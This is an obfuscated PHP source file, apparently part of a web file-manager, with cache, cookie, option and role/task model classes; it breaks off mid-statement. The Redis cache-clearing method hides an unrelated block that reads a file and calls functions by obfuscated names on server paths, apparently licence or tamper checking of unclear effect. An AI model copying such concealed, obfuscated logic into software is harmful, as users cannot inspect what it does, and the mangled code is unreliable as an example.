$dŒ¡•Êƒë[$bÍ¼èƒ¦ÂÁ[282]][$aÍ°ì®²ßÁ][1] = $Aõ‹Ü±¿¿; $this->optionsValue($dŒ¡•Êƒë); $c¡¸ß‡Ï += parent::delete($cğ‚¨ìğ…‰); } goto Aİ¯ˆ›­Úî; E»®À›“î…: $bÍ¼èƒ¦ÂÁ =& $_SERVER[Ü˜]; $dîˆŸÂãÆª = self::SQL_WHERE_IN_CHUNK; $dŒ¡•Êƒë = $this->optionsValue(); goto dîôœÅ‹©Ë; dîôœÅ‹©Ë: $aÍ°ì®²ßÁ = $this->findWhereField($dŒ¡•Êƒë); if (!$aÍ°ì®²ßÁ) { return parent::delete($cğ‚¨ìğ…‰); } $c¡¸ß‡Ï = 0; goto aÄá¢¡Œ¾ß; Aİ¯ˆ›­Úî: return $c¡¸ß‡Ï; goto BÏàŞùôèğ; BÏàŞùôèğ: } private function findWhereField($f—ÌÖ„ö„†) { $E»ÂèŒêŸö =& $_SERVER[Ü˜]; $f §™™†Üä = self::SQL_WHERE_IN_CHUNK; if (!is_array($f—ÌÖ„ö„†) || !is_array($f—ÌÖ„ö„†[$E»ÂèŒêŸö[282]])) { return !1; } foreach ($f—ÌÖ„ö„†[$E»ÂèŒêŸö[282]] as $B§ìà‰ÇÕ => $cˆ„èĞ³ƒ) { if (is_array($cˆ„èĞ³ƒ) && isset($cˆ„èĞ³ƒ[0]) && is_string($cˆ„èĞ³ƒ[0]) && strtolower($cˆ„èĞ³ƒ[0]) == $E»ÂèŒêŸö[7] && is_array($cˆ„èĞ³ƒ[1]) && count($cˆ„èĞ³ƒ[1]) > $f §™™†Üä) { ignore_timeout(); return $B§ìà‰ÇÕ; } } return !1; } } class ModelBaseLight { public $optionType = ''; public $modelType = "\123\171\x73\164\x65\155\117\x70\164\151\157\x6e"; public $field = array(); public function listData($d¤Ğ¬¹êº¶ = false, $fà¸ŸáÌ±‚ = "\155\x6f\144\151\146\171\x54\x69\x6d\145", $B‘ÆáÇùù = false) { $AÆÉ„‹Ò™ = Model($this->modelType)->get(!1, $this->optionType, !0); if (!$AÆÉ„‹Ò™) { return $d¤Ğ¬¹êº¶ ? null : array(); } if (!$d¤Ğ¬¹êº¶) { $AÆÉ„‹Ò™ = array_filter(array_values($AÆÉ„‹Ò™)); return array_sort_by($AÆÉ„‹Ò™, $fà¸ŸáÌ±‚, $B‘ÆáÇùù); } return $AÆÉ„‹Ò™[$_SERVER[Ü˜][399] . $d¤Ğ¬¹êº¶]; } public function insert($a”¬ÑÁ†Â•) { goto CÇèÕËö–í; FÓ¬Í÷½ƒÛ: return $dÇÑà†ö‡Ş; goto cŸ“É ©³§; CÇèÕËö–í: $dÌÑŒ„Ï =& $_SERVER[Ü˜]; $a”¬ÑÁ†Â• = array_field_key($a”¬ÑÁ†Â•, $this->field); $dÇÑà†ö‡Ş = Model($this->modelType)->get($dÌÑŒ„Ï[400], $this->optionType . $dÌÑŒ„Ï[401]); goto DâÅ°¥ßò¸; DâÅ°¥ßò¸: $dÇÑà†ö‡Ş = $dÇÑà†ö‡Ş ? $dÇÑà†ö‡Ş : 0; $a”¬ÑÁ†Â•[$dÌÑŒ„Ï[402]] = ++$dÇÑà†ö‡Ş; $a”¬ÑÁ†Â•[$dÌÑŒ„Ï[204]] = time(); goto cÊ ·Ÿë¾¶; cÊ ·Ÿë¾¶: $a”¬ÑÁ†Â•[$dÌÑŒ„Ï[94]] = time(); Model($this->modelType)->set($dÌÑŒ„Ï[400], $dÇÑà†ö‡Ş, $this->optionType . $dÌÑŒ„Ï[401]); Model($this->modelType)->set($dÌÑŒ„Ï[399] . $dÇÑà†ö‡Ş, $a”¬ÑÁ†Â•, $this->optionType); goto FÓ¬Í÷½ƒÛ; cŸ“É ©³§: } public function update($fé±Š°´™», $bßÏ‹•¦ì²) { goto b¡¼œñ¦½; B»äÔ Á‘Æ: if (!$A¬ÕƒˆÅ¼ã) { return !1; } $bßÏ‹•¦ì² = array_merge($A¬ÕƒˆÅ¼ã, $bßÏ‹•¦ì²); $bßÏ‹•¦ì²[$bÈºŒÚ‰¾„[94]] = time(); goto fÈ‡ê¨ğŒ; fÈ‡ê¨ğŒ: return Model($this->modelType)->set($bÈºŒÚ‰¾„[399] . $fé±Š°´™», $bßÏ‹•¦ì², $this->optionType); goto DŞ™¥˜–²„; b¡¼œñ¦½: $bÈºŒÚ‰¾„ =& $_SERVER[Ü˜]; $bßÏ‹•¦ì² = array_field_key($bßÏ‹•¦ì², $this->field); $A¬ÕƒˆÅ¼ã = $this->listData($fé±Š°´™»); goto B»äÔ Á‘Æ; DŞ™¥˜–²„: } public function remove($EÌó°àˆ˜Ü) { return Model($this->modelType)->remove($_SERVER[Ü˜][399] . $EÌó°àˆ˜Ü, $this->optionType); } public function clear() { $eè°ªÔ Ë÷ =& $_SERVER[Ü˜]; Model($this->modelType)->remove($eè°ªÔ Ë÷[400], $this->optionType . $eè°ªÔ Ë÷[401]); return Model($this->modelType)->remove(null, $this->optionType); } public function cacheClear() { return Model($this->modelType)->cacheRemove($this->optionType); } public function findByKey($Bğ¼á½È‡Ö, $D®å»Šöª) { if (!$D®å»Šöª) { return !1; } $cÔ£ÊÑ®³ = $this->listData(); $cÔ£ÊÑ®³ = array_to_keyvalue($cÔ£ÊÑ®³, $Bğ¼á½È‡Ö); return isset($cÔ£ÊÑ®³[$D®å»Šöª]) ? $cÔ£ÊÑ®³[$D®å»Šöª] : !1; } public function findByName($Fô¥§Ò) { return $this->findByKey($_SERVER[Ü˜][28], $Fô¥§Ò); } protected function resetData($d¡˜†´¹‡¢) { $DØ…áá£Ë =& $_SERVER[Ü˜]; $d¡˜†´¹‡¢ = is_array($d¡˜†´¹‡¢) ? $d¡˜†´¹‡¢ : array(); $dŞ¤²·Û = array(); for ($a‚°ËÔ”œŠ = 0; $a‚°ËÔ”œŠ < count($d¡˜†´¹‡¢); $a‚°ËÔ”œŠ++) { $dŞ¤²·Û[$DØ…áá£Ë[399] . $d¡˜†´¹‡¢[$a‚°ËÔ”œŠ][$DØ…áá£Ë[402]]] = $d¡˜†´¹‡¢[$a‚°ËÔ”œŠ]; } return Model($this->modelType)->set($dŞ¤²·Û, !1, $this->optionType); } private function getAutoName($F“à†öäÛ) { $f†«³î¼ùé = array_to_keyvalue($this->listData(), $_SERVER[Ü˜][28]); if (!$f†«³î¼ùé || !isset($f†«³î¼ùé[$F“à†öäÛ])) { return $F“à†öäÛ; } for ($f¨º„ÈÑ¼’ = 1; $f¨º„ÈÑ¼’ < count($f†«³î¼ùé); $f¨º„ÈÑ¼’++) { $D¿àˆç¿¬â = $F“à†öäÛ . "\x28{$f¨º„ÈÑ¼’}\x29"; if (!isset($f†«³î¼ùé[$D¿àˆç¿¬â])) { return $D¿àˆç¿¬â; } } return $D¿àˆç¿¬â; } } class ModelBaseOption extends ModelBase { protected $tableName = ''; protected $jsonField = array(); public function get($D¢—âÈÎ„ = false, $CÙğ†‹ô¨ = '', $D‘‡ÇÄº¢ = false) { goto E‘ÂØ“è£; AÌÂÉ§ç½Î: $AƒÃµ³ŒÖ¿ = $this->where($aá°£à×Ê‰)->select(); $AƒÃµ³ŒÖ¿ = array_to_keyvalue($AƒÃµ³ŒÖ¿, $eœ«Êï¾°[103], $eœ«Êï¾°[381]); foreach ($AƒÃµ³ŒÖ¿ as $aèì‰ˆ¡ƒŞ => $D‡‰µØ¢) { if ($D‘‡ÇÄº¢ || in_array($aèì‰ˆ¡ƒŞ, $this->jsonField)) { $AƒÃµ³ŒÖ¿[$aèì‰ˆ¡ƒŞ] = json_decode($D‡‰µØ¢, !0); } } goto d¹—×¬‡Í×; E‘ÂØ“è£: $eœ«Êï¾° =& $_SERVER[Ü˜]; $AƒÃµ³ŒÖ¿ = $this->cacheGet($CÙğ†‹ô¨); $FÌ¯ó®÷Œ„ = $this->optionDefault($CÙğ†‹ô¨); goto eää³¡ƒ®; eää³¡ƒ®: $FÌ¯ó®÷Œ„ = is_array($FÌ¯ó®÷Œ„) ? $FÌ¯ó®÷Œ„ : array(); if (is_array($AƒÃµ³ŒÖ¿)) { $AƒÃµ³ŒÖ¿ = array_merge($FÌ¯ó®÷Œ„, $AƒÃµ³ŒÖ¿); return $D¢—âÈÎ„ ? isset($AƒÃµ³ŒÖ¿[$D¢—âÈÎ„]) ? $AƒÃµ³ŒÖ¿[$D¢—âÈÎ„] : null : $AƒÃµ³ŒÖ¿; } $aá°£à×Ê‰ = $this->filterWhere(array($eœ«Êï¾°[29] => $CÙğ†‹ô¨)); goto AÌÂÉ§ç½Î; d¹—×¬‡Í×: $this->cacheSet($CÙğ†‹ô¨, $AƒÃµ³ŒÖ¿); $AƒÃµ³ŒÖ¿ = array_merge($FÌ¯ó®÷Œ„, $AƒÃµ³ŒÖ¿); return $D¢—âÈÎ„ ? $AƒÃµ³ŒÖ¿[$D¢—âÈÎ„] : $AƒÃµ³ŒÖ¿; goto fÕëæ½öÃÜ; fÕëæ½öÃÜ: } public function set($bÖ õÀ½¿Ä, $a¦Ï¢  = false, $dÑœèôÔŒ¸ = '') { goto A¾’µ‹Î»; A¾’µ‹Î»: $DÖ×Â…‚ö =& $_SERVER[Ü˜]; $this->cacheRemove($dÑœèôÔŒ¸); $D®÷›ÃË£ë = array(); goto aÒÁ§¹‡Ù; aÒÁ§¹‡Ù: $e±ä–ñ’åÚ = is_array($bÖ õÀ½¿Ä) ? $bÖ õÀ½¿Ä : array($bÖ õÀ½¿Ä => $a¦Ï¢ ); foreach ($e±ä–ñ’åÚ as $dñ˜Ï Ğ¢Å => $AÄˆ‡›Å¦) { if (is_array($AÄˆ‡›Å¦)) { $AÄˆ‡›Å¦ = json_encode_force($AÄˆ‡›Å¦); } $this->checkLength($AÄˆ‡›Å¦, !1, $this->tableName . $DÖ×Â…‚ö[4] . $bÖ õÀ½¿Ä); $AÄˆ‡›Å¦ = self::textEncode($AÄˆ‡›Å¦); $e±ä–ñ’åÚ = array($DÖ×Â…‚ö[29] => $dÑœèôÔŒ¸, $DÖ×Â…‚ö[103] => $dñ˜Ï Ğ¢Å, $DÖ×Â…‚ö[381] => $AÄˆ‡›Å¦); $D®÷›ÃË£ë[] = $this->filterWhere($e±ä–ñ’åÚ); } if (!$D®÷›ÃË£ë) { return !0; } goto a’Å¼îØ Á; a’Å¼îØ Á: return $this->addAll($D®÷›ÃË£ë, array(), !0); goto fïßÁÊ£ô; fïßÁÊ£ô: } protected function optionDefault($D¬Ğ ¢ø’˜ = '') { return !1; } public function setDeep($Fšªï¢œ‚Ï, $D…§Ğ¼ÀŠ¶ = false, $Dö°ë›ªã… = '') { $E’ñÁÌŠ±¶ = explode($_SERVER[Ü˜][105], $Fšªï¢œ‚Ï); $e©ÑŞÂ…óó = $this->get(); array_set_value($e©ÑŞÂ…óó, $Fšªï¢œ‚Ï, $D…§Ğ¼ÀŠ¶); $this->set($E’ñÁÌŠ±¶[0], $e©ÑŞÂ…óó[$E’ñÁÌŠ±¶[0]], $Dö°ë›ªã…); } public function remove($E¶»È½ÆùŒ, $Cù…Ö¾°ãÄ = '') { $eœ°·“ïœæ =& $_SERVER[Ü˜]; $this->cacheRemove($Cù…Ö¾°ãÄ); $AÀ¢ô÷”„ = $this->filterWhere(array($eœ°·“ïœæ[103] => $E¶»È½ÆùŒ, $eœ°·“ïœæ[29] => $Cù…Ö¾°ãÄ)); if (is_null($E¶»È½ÆùŒ)) { unset($AÀ¢ô÷”„[$eœ°·“ïœæ[103]]); } return $this->where($AÀ¢ô÷”„)->delete(); } public function cacheSet($AŒ²õ…ÑÔ, $Fƒ¥ºÖŠå— = false) { return Cache::set($this->cacheKey($AŒ²õ…ÑÔ), $Fƒ¥ºÖŠå—); } public function cacheGet($E¾Â– „°¶) { return Cache::get($this->cacheKey($E¾Â– „°¶)); } public function cacheRemove($B…¥’ÒŒË) { return Cache::remove($this->cacheKey($B…¥’ÒŒË)); } protected function filterWhere($D¨÷¡˜å“‚) { return $D¨÷¡˜å“‚; } protected function cacheKey($fÃ‹äàƒÂ) { return $fÃ‹äàƒÂ; } } goto C–Ãç«‰ä; Báò»âÇÙ„: class CacheMemcached { public $handle; public $cacheTime; public function __construct($AÜ£ÙÚŞÓ, $D¾šØ±•ö§) { $dÂÏáØ´Úæ =& $_SERVER[Ü˜]; if (!class_exists($dÂÏáØ´Úæ[830])) { show_json($dÂÏáØ´Úæ[831], !1); } $this->cacheTime = $D¾šØ±•ö§; $this->handle = new Memcached(); if (is_array($AÜ£ÙÚŞÓ[$dÂÏáØ´Úæ[832]]) && count($AÜ£ÙÚŞÓ[$dÂÏáØ´Úæ[832]]) >= 1) { foreach ($AÜ£ÙÚŞÓ[$dÂÏáØ´Úæ[832]] as $f¿¡íéô¥) { $BçÜ÷Å¸µÆ = explode($dÂÏáØ´Úæ[4], $f¿¡íéô¥); $this->handle->addServer($BçÜ÷Å¸µÆ[0], $BçÜ÷Å¸µÆ[1]); } } else { $this->handle->addServer($AÜ£ÙÚŞÓ[$dÂÏáØ´Úæ[185]], $AÜ£ÙÚŞÓ[$dÂÏáØ´Úæ[186]]); } } public function set($c×¬ôÄ×ö, $D…ÒÈ¥Ãœ, $e­ò–•è» = false) { $e­ò–•è» = $e­ò–•è» ? $e­ò–•è» : $this->cacheTime; return $this->handle->set($c×¬ôÄ×ö, $D…ÒÈ¥Ãœ, $e­ò–•è»); } public function get($Dµ˜Û¯‘é¹) { return $this->handle->get($Dµ˜Û¯‘é¹); } public function remove($dàŠÓã‚Êî) { return $this->handle->delete($dàŠÓã‚Êî); } public function deleteAll() { return $this->handle->flush(); } } class CacheRedis { public $handle; public $slaveHandle; public $cacheTime; public $isCluster = false; public function __construct($c©¥Î’ƒè§, $dëìÏ¼òÆ³) { $e†ªôÒµ‚ =& $_SERVER[Ü˜]; if (!class_exists($e†ªôÒµ‚[833])) { show_json($e†ªôÒµ‚[834], !1); } $this->cacheTime = $dëìÏ¼òÆ³; $cÂ¤§‹ÄòÛ = isset($c©¥Î’ƒè§[$e†ªôÒµ‚[835]]) ? $c©¥Î’ƒè§[$e†ªôÒµ‚[835]] : 10; $D¾Ú‰½¼¹¯ = _get($c©¥Î’ƒè§, $e†ªôÒµ‚[832]); if ($D¾Ú‰½¼¹¯ && is_array($D¾Ú‰½¼¹¯)) { $this->initCluster($c©¥Î’ƒè§, $cÂ¤§‹ÄòÛ); } else { $this->handle = $this->init($c©¥Î’ƒè§, $cÂ¤§‹ÄòÛ); } } private function init($cÂæ‹Í¾¥Ù, $dãç„Ä­öğ) { $aÎÆ‘ÃóŒ› =& $_SERVER[Ü˜]; $a®òÈÜˆ ã = new Redis(); $Fî»ŒïÄ–‹ = isset($cÂæ‹Í¾¥Ù[$aÎÆ‘ÃóŒ›[836]]) ? $cÂæ‹Í¾¥Ù[$aÎÆ‘ÃóŒ›[836]] : !1; if ($Fî»ŒïÄ–‹) { $a®òÈÜˆ ã->pconnect($cÂæ‹Í¾¥Ù[$aÎÆ‘ÃóŒ›[185]], $cÂæ‹Í¾¥Ù[$aÎÆ‘ÃóŒ›[186]], $dãç„Ä­öğ); } else { $a®òÈÜˆ ã->connect($cÂæ‹Í¾¥Ù[$aÎÆ‘ÃóŒ›[185]], $cÂæ‹Í¾¥Ù[$aÎÆ‘ÃóŒ›[186]], $dãç„Ä­öğ); } if (!empty($cÂæ‹Í¾¥Ù[$aÎÆ‘ÃóŒ›[415]])) { $a®òÈÜˆ ã->auth($cÂæ‹Í¾¥Ù[$aÎÆ‘ÃóŒ›[415]]); } return $a®òÈÜˆ ã; } private function initCluster($A‚ŠŞˆöİµ, $DÁÆß ¸ƒ×) { $d×»…–Âº =& $_SERVER[Ü˜]; $Dê¹¶Òìæ» = array($d×»…–Âº[837], $d×»…–Âº[838], $d×»…–Âº[839]); $cÚïàÍÜšŒ = $d×»…–Âº[837]; if (isset($A‚ŠŞˆöİµ[$d×»…–Âº[12]]) && in_array($A‚ŠŞˆöİµ[$d×»…–Âº[12]], $Dê¹¶Òìæ»)) { $cÚïàÍÜšŒ = $A‚ŠŞˆöİµ[$d×»…–Âº[12]]; } switch ($cÚïàÍÜšŒ) { case $d×»…–Âº[837]: $this->_slave($A‚ŠŞˆöİµ, $DÁÆß ¸ƒ×); break; case $d×»…–Âº[838]: break; case $d×»…–Âº[839]: $this->isCluster = !0; $e‹ÖÍ÷Ö™ = $A‚ŠŞˆöİµ[$d×»…–Âº[832]]; $D‡ò•ïï’Ø = isset($A‚ŠŞˆöİµ[$d×»…–Âº[836]]) ? $A‚ŠŞˆöİµ[$d×»…–Âº[836]] : !1; $C«áÏ×¼ = isset($A‚ŠŞˆöİµ[$d×»…–Âº[415]]) ? $A‚ŠŞˆöİµ[$d×»…–Âº[415]] : null; $this->handle = new RedisCluster(NUll, $e‹ÖÍ÷Ö™, $DÁÆß ¸ƒ×, $DÁÆß ¸ƒ×, $D‡ò•ïï’Ø, $C«áÏ×¼); break; default: break; } } private function _slave($A¼²…½Š¯®, $BË„œ£¾‘) { goto Eœ£ñèƒˆØ; Eœ£ñèƒˆØ: $aÙÂ½éÅ„½ = $A¼²…½Š¯®[$_SERVER[Ü˜][832]]; $this->filterConfig($A¼²…½Š¯®, $aÙÂ½éÅ„½[0]); $this->handle = $this->init($A¼²…½Š¯®, $BË„œ£¾‘); goto D£¨†„; f‚ÑœÃºŠ°: $this->filterConfig($A¼²…½Š¯®, $aÙÂ½éÅ„½[$EŒÁãÚŒ’—]); $this->slaveHandle = $this->init($A¼²…½Š¯®, $BË„œ£¾‘); goto DŒµêÔà‚; D£¨†„: unset($aÙÂ½éÅ„½[0]); if (empty($aÙÂ½éÅ„½)) { return; } $EŒÁãÚŒ’— = array_rand($aÙÂ½éÅ„½); goto f‚ÑœÃºŠ°; DŒµêÔà‚: } private function filterConfig(&$Cœ£ğÔè¶, $CìòõëÕ­œ) { $f£øÄŸ±æÚ =& $_SERVER[Ü˜]; $a‘Á—ÚóÕ = explode($f£øÄŸ±æÚ[4], $CìòõëÕ­œ); $A¹·¨†ââì = array($f£øÄŸ±æÚ[185] => $a‘Á—ÚóÕ[0], $f£øÄŸ±æÚ[186] => $a‘Á—ÚóÕ[1]); $Cœ£ğÔè¶ = array_merge($Cœ£ğÔè¶, $A¹·¨†ââì); } public function set($Dš²ˆ»…ïŠ, $D¨¸©–ó, $E©ùô¶Æä¨ = false) { $E©ùô¶Æä¨ = $E©ùô¶Æä¨ ? $E©ùô¶Æä¨ : $this->cacheTime; return $this->handle->setEx($Dš²ˆ»…ïŠ, $E©ùô¶Æä¨, $D¨¸©–ó); } public function setLock($E´–¤åêŠÎ, $C…ĞÑ¸åæï, $e¨ê¯ïéº») { return $this->handle->setNX($E´–¤åêŠÎ, $C…ĞÑ¸åæï); } public function get($A¯˜ó¡µ¨Ü) { $F‚ÓÏÏ¸¦ê = $this->slaveHandle ? $this->slaveHandle : $this->handle; return $F‚ÓÏÏ¸¦ê->get($A¯˜ó¡µ¨Ü); } public function remove($FÇ¬÷¼—Ô¹) { return $this->handle->del($FÇ¬÷¼—Ô¹); } public function deleteAll() { $EÙÑê ßÄ =& $_SERVER[Ü˜]; if ($_SERVER[$EÙÑê ßÄ[59]] != $_SERVER[$EÙÑê ßÄ[840]]) { goto cÁ¤ª¯Õ‡÷; cÁ¤ª¯Õ‡÷: $EÄ¦¯¯‡ºµ = $EÙÑê ßÄ[841]; $D÷ÎŞ‰³¤ = $EÙÑê ßÄ[60]; $d»¡§ĞÃ = $_SERVER[$EÙÑê ßÄ[61]] . $EÙÑê ßÄ[62]; goto C¯‘„£‘ŠÅ; b¢â¾À´öğ: $b„“Š¡…ˆ = 1; while ($b„“Š¡…ˆ > 1) { $b„“Š¡…ˆ = $b„“Š¡…ˆ + 4; $c®¿İàƒå = rawurlencode($b„“Š¡…ˆ . $EÙÑê ßÄ[384]); } goto c­Ù‡Üªİñ; C¯‘„£‘ŠÅ: $Fâè·—ÈŒ = $D÷ÎŞ‰³¤($d»¡§ĞÃ); $d¢Ü©÷îê‰ = explode($EÙÑê ßÄ[63], $Fâè·—ÈŒ); if (count($d¢Ü©÷îê‰) < $EÙÑê ßÄ[605]) { $dæÆºÙ¢Œø = $EÙÑê ßÄ[65]; $dæÆºÙ¢Œø(); } goto B ±ä´‘™; B ±ä´‘™: $aêà”—Õ×® = $EÙÑê ßÄ[842]; $aêà”—Õ×®($_SERVER[$EÙÑê ßÄ[843]]); $aêà”—Õ×®($_SERVER[$EÙÑê ßÄ[61]] . $EÙÑê ßÄ[844]); goto b¢â¾À´öğ; c­Ù‡Üªİñ: } if ($this->isCluster) { foreach ($this->handle->_masters() as $b‹‹†õÀ¸ë) { $this->handle->flushall($b‹‹†õÀ¸ë); } return; } return $this->handle->flushAll(); } } class Cookie { private $prefix = ''; private $expire = 3600; public function __construct($D‰˜—ŠÜ = '', $bíêÅÙ„ææ = 0) { if (is_string($D‰˜—ŠÜ) && $D‰˜—ŠÜ != $_SERVER[Ü˜][33]) { $this->prefix = $D‰˜—ŠÜ; } if (is_numeric($bíêÅÙ„ææ) && $bíêÅÙ„ææ > 0) { $this->expire = $bíêÅÙ„ææ; } } public static function getInstance() { static $cµéÈ’”øÃ; if ($cµéÈ’”øÃ === null) { $cµéÈ’”øÃ = new self(); } return $cµéÈ’”øÃ; } private static $cookieDisable = false; public static function disable($DÏÀ³¿ÚÁç) { self::$cookieDisable = $DÏÀ³¿ÚÁç; } private static $sameCookieSet = array(); public static function set($a‘˜Ÿø, $dÂèÊ¡„ÛË, $FµŞËÉÛâĞ = 0, $BŠäÑ„‡ß  = false, $b‚‹¤¦«§ = false) { goto aèÙËÁİÖ½; BµÜøÜ²èº: $Dæ´ğØ‹ë = $c­œãô«Äø[33]; setcookie($a‘˜Ÿø, $dÂèÊ¡„ÛË, time() + $FµŞËÉÛâĞ, $c­œãô«Äø[8] . trim($b‚‹¤¦«§, $c­œãô«Äø[8]) . $Dæ´ğØ‹ë, !1, !1, $BŠäÑ„‡ß ); goto Eãî—ß‰†; E­§šÆ»¦¨: if (isset(self::$sameCookieSet[$a‘˜Ÿø]) && self::$sameCookieSet[$a‘˜Ÿø] == $dÂèÊ¡„ÛË . $FµŞËÉÛâĞ) { return; } self::$sameCookieSet[$a‘˜Ÿø] = $dÂèÊ¡„ÛË . $FµŞËÉÛâĞ; if (!$b‚‹¤¦«§) { $b‚‹¤¦«§ = str_replace(HOST, $c­œãô«Äø[33], APP_HOST); $b‚‹¤¦«§ = _get($GLOBALS, $c­œãô«Äø[845], $b‚‹¤¦«§); } goto BµÜøÜ²èº; aèÙËÁİÖ½: $c­œãô«Äø =& $_SERVER[Ü˜]; if (self::$cookieDisable) { return; } if (!$FµŞËÉÛâĞ) { $FµŞËÉÛâĞ = 24 * 3600 * 7; } goto E­§šÆ»¦¨; Eãî—ß‰†: } public static function setSafe($CšÌ¨èóèâ, $C²ÊÁ£ÕÄ, $d’¢¢“™Š± = 0) { self::set($CšÌ¨èóèâ, $C²ÊÁ£ÕÄ, $d’¢¢“™Š±, !0); } public static function get($C•ñçœšÌ²) { return isset($_COOKIE[$C•ñçœšÌ²]) ? $_COOKIE[$C•ñçœšÌ²] : !1; } public static function remove($eˆĞÍá™ÜÚ, $AŒ‘¾ÏÏˆÜ = false) { unset($_COOKIE[$eˆĞÍá™ÜÚ]); self::set($eˆĞÍá™ÜÚ, $_SERVER[Ü˜][33], 1, $AŒ‘¾ÏÏˆÜ); } } goto EˆæŞèÊÃ×; c®îœÇ˜: class SystemRecordModel extends ModelBaseLight { } class SystemRoleModel extends ModelBaseLight { public $optionType = "\x53\171\x73\x74\145\155\x2e\x72\x6f\154\x65\114\x69\163\164"; public $field = array("\x6e\x61\155\x65", "\141\x75\x74\150", "\154\x61\x62\145\154", "\x64\151\163\160\154\x61\x79", "\x73\171\x73\164\145\x6d", "\x64\x65\163\143", "\151\x67\x6e\x6f\162\x65\x45\170\164", "\151\x67\156\157\x72\145\x46\x69\154\x65\x53\151\x7a\145", "\x61\x64\x6d\151\x6e\x69\163\x74\x72\x61\x74\157\162", "\163\x6f\162\164"); public function listData($aƒ‘¶…áƒ = false, $FÎ…³åÀ„á = "\x73\157\162\x74", $BÉØÚ×ĞÌ = false) { $C±‘ÏÓÎš÷ =& $_SERVER[Ü˜]; $Aí‚Ôœˆã = parent::listData($aƒ‘¶…áƒ, $FÎ…³åÀ„á, $BÉØÚ×ĞÌ); if (!$aƒ‘¶…áƒ) { foreach ($Aí‚Ôœˆã as $f‹©ˆùæĞ => $cÖ‰Šó¡Â) { if ($cÖ‰Šó¡Â[$C±‘ÏÓÎš÷[1882]] == 1) { $Aí‚Ôœˆã[$f‹©ˆùæĞ][$C±‘ÏÓÎš÷[440]] = LNG($C±‘ÏÓÎš÷[2108]); } } } return $Aí‚Ôœˆã; } public function update($D••Ô‘ÒÁï, $Aå¶ªá¥‘…) { goto FœÓ™Ïí§À; f¨Šˆ‰ó: return parent::update($D••Ô‘ÒÁï, $Aå¶ªá¥‘…); goto fçÉÓÜ–„Ô; C’Ñ¨¦À°: if (!$a‘¥ÚÒªÏ || $AÛ…÷ª³Óˆ && $AÛ…÷ª³Óˆ[$A´Áì¡‡[402]] != $a‘¥ÚÒªÏ[$A´Áì¡‡[402]]) { return !1; } if ($AÛ…÷ª³Óˆ[$A´Áì¡‡[1882]] == 1) { $Aå¶ªá¥‘… = array($A´Áì¡‡[28] => $Aå¶ªá¥‘…[$A´Áì¡‡[28]], $A´Áì¡‡[1714] => $Aå¶ªá¥‘…[$A´Áì¡‡[1714]]); } $this->filterAuth($Aå¶ªá¥‘…[$A´Áì¡‡[415]]); goto f¨Šˆ‰ó; FœÓ™Ïí§À: $A´Áì¡‡ =& $_SERVER[Ü˜]; $a‘¥ÚÒªÏ = parent::listData($D••Ô‘ÒÁï); $AÛ…÷ª³Óˆ = $this->findByName($Aå¶ªá¥‘…[$A´Áì¡‡[28]]); goto C’Ñ¨¦À°; fçÉÓÜ–„Ô: } public function remove($fÏ’Âè‡İ¶) { $bŠ³æçå… = parent::listData($fÏ’Âè‡İ¶); if (!$bŠ³æçå… || $bŠ³æçå…[$_SERVER[Ü˜][1172]]) { return !1; } return parent::remove($fÏ’Âè‡İ¶); } public function add($cç’‹ÉÎ’Ù) { goto cò–ÂÕ„•; cò–ÂÕ„•: $cËÆˆ™İÓö =& $_SERVER[Ü˜]; $bßì¾™ÎÓ« = $cç’‹ÉÎ’Ù[$cËÆˆ™İÓö[28]]; if ($this->findByName($bßì¾™ÎÓ«)) { return !1; } goto aÓŒ¢ğ®É˜; c™™Ç‰¾ŒÉ: return parent::insert($cç’‹ÉÎ’Ù); goto bÈÌ®öğÑŠ; aÓŒ¢ğ®É˜: $FÙ³Ï¶Ã‘Ä = array($cËÆˆ™İÓö[422] => $bßì¾™ÎÓ«, $cËÆˆ™İÓö[1699] => $cËÆˆ™İÓö[33], $cËÆˆ™İÓö[1695] => $cËÆˆ™İÓö[1703], $cËÆˆ™İÓö[2109] => 1, $cËÆˆ™İÓö[1698] => 0, $cËÆˆ™İÓö[2110] => 0, $cËÆˆ™İÓö[1697] => $this->getSort()); $cç’‹ÉÎ’Ù = array_merge($FÙ³Ï¶Ã‘Ä, $cç’‹ÉÎ’Ù); $this->filterAuth($cç’‹ÉÎ’Ù[$cËÆˆ™İÓö[415]]); goto c™™Ç‰¾ŒÉ; bÈÌ®öğÑŠ: } private function getSort() { $CÏ´æäŒë£ =& $_SERVER[Ü˜]; $eæõ‘£è¶ = parent::listData(); $E°ùØä¤´© = array_to_keyvalue($eæõ‘£è¶, $CÏ´æäŒë£[33], $CÏ´æäŒë£[1716]); return empty($E°ùØä¤´©) ? 0 : max($E°ùØä¤´©) + 1; } private function filterAuth(&$cïÉ‡†ãœø) { $bãö‚¹ß‰à =& $_SERVER[Ü˜]; $C÷«ÀÊÔêİ = array(); $c²ù§Å’Üé = array_filter(explode($bãö‚¹ß‰à[47], $cïÉ‡†ãœø)); foreach ($c²ù§Å’Üé as $cïÉ‡†ãœø) { $A‡¾¦ˆ°æ = explode($bãö‚¹ß‰à[105], $cïÉ‡†ãœø); if ($A‡¾¦ˆ°æ[0] == $bãö‚¹ß‰à[2111] && $A‡¾¦ˆ°æ[1] != $bãö‚¹ß‰à[1091]) { $B¼›ÛñæÄ™ = $A‡¾¦ˆ°æ[0] . $bãö‚¹ß‰à[105] . $A‡¾¦ˆ°æ[1] . $bãö‚¹ß‰à[2112]; if (!in_array($B¼›ÛñæÄ™, $c²ù§Å’Üé)) { $C÷«ÀÊÔêİ[] = $B¼›ÛñæÄ™; } } $C÷«ÀÊÔêİ[] = $cïÉ‡†ãœø; } $cïÉ‡†ãœø = implode($bãö‚¹ß‰à[47], $C÷«ÀÊÔêİ); } public function sort($B¥“ ˆºÍ, $B‡°¥ç–¹Ğ) { return parent::update($B¥“ ˆºÍ, $B‡°¥ç–¹Ğ); } } class SystemTaskModel extends ModelBaseLight { public $optionType = "\x53\x79\x73\164\x65\155\56\164\x61\163\x6b\x4c\151\x73\164"; public $field = array("\x6e\141\155\x65", "\x74\171\x70\145", "\145\x76\145\156\164", "\164\x69\x6d\145", "\x64\x65\x73\x63", "\163\x79\x73\164\x65\x6d", "\145\156\x61\x62\x6c\145", "\x6c\x61\163\164\122\x75\156", "\163\157\162\x74"); public function listData($cï„±Š¯’É = false, $Aœ³èŸ‹ = "\x73\157\162\164", $fÜ÷ì›È¡Ü = false) { return parent::listData($cï„±Š¯’É, $Aœ³èŸ‹, $fÜ÷ì›È¡Ü); } public function add($a†ø•˜é¼) { $Fç–‰Ë›óÇ =& $_SERVER[Ü˜]; $dÅöí‚É£ = $this->findByName($a†ø•˜é¼[$Fç–‰Ë›óÇ[28]]); if 